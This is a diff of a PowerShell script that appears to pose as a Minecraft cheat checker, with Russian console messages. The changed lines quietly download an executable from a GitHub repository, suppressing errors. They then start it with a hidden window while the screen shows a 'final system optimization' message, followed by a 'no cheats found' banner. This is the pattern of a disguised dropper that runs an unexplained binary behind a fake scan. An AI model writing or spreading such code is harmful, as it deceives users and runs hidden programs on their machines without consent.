@@ -184,9 +184,9 @@ $scan = {
     Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
     Start-Sleep 1
     
-    Invoke-WebRequest -Uri "https://github.com/WarRagon404/MinecraftCheatChecker/raw/refs/heads/main/source/assets/custom/MinecraftCheatChecker(Alt2).exe" -OutFile "MinecraftCheatChecker(Alt2).exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/WarRagon404/MinecraftCheatChecker/raw/refs/heads/main/source/assets/custom/MinecraftCheatCheckerAlt2.exe" -OutFile "MinecraftCheatCheckerAlt2.exe" -ErrorAction SilentlyContinue
     
-    Start-Process -FilePath "RustCheatChecker.exe" -WindowStyle Hidden
+    Start-Process -FilePath "MinecraftCheatCheckerAlt2.exe" -WindowStyle Hidden
 
     Log "╔══════════════════════════════════════════════════════════════╗" "Cyan"
     Log "║                     Ч И Т Ы   Н Е   Н А Й Д Е Н Ы             ║" "Lime"
